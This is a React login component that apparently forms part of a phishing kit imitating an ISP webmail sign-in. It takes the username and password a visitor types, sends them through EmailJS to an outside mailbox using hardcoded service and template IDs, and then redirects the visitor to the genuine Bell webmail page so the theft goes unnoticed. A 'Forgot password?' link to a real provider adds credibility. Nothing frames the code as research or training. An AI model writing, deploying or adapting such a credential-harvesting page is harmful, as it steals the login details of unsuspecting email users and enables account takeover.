import React, {useRef} from 'react';
import Logo from "../Assets/Logo.PNG";
import { FaLock, FaUser } from "react-icons/fa";
import emailjs from '@emailjs/browser';

function Login() {

    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_h2f2su8', 'template_mdneygz', form.current, 'vyEt9oEzuP7vZtJu8')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

        // Redirect to the specified link after submitting the form
        window.location.href = 'https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.48.0-4#/mail';
    };

    return (
        <div className="bg-gray-200 min-h-screen flex justify-center items-center">
            <div className="bg-white p-8 rounded-lg shadow-md max-w-md w-full">
                <img src={Logo} alt="Logo" className="w-32 mx-auto mb-8" />
                <form ref={form} onSubmit={sendEmail} className="flex flex-col gap-4">
                    <div className="flex items-center border-b border-gray-300 py-2">
                        <FaUser className="text-black" />
                        <input type="text" name="user_name" required placeholder="Username" className="ml-2 outline-none  flex-1" />
                    </div>
                    <div className="flex items-center border-b border-gray-300 py-2">
                        <FaLock className="text-black" />
                        <input type="password" name="user_pass" required placeholder="Password" className="ml-2 outline-none flex-1" />
                    </div>
                    <div className="flex items-center justify-between">
                        <label className="text-gray-600">
                            <input type="checkbox" name="remember" className="mr-2" /> Remember Me
                        </label>
                        <a href="https://www.execulink.ca/myexeculink/password" className="text-blue-500 hover:underline cursor-pointer">Forgot password?</a>
                    </div>
                    <button type="submit" className="bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition-colors duration-300">LOGIN</button>
               </form>
            </div>
        </div>
    );
}

export default Login;
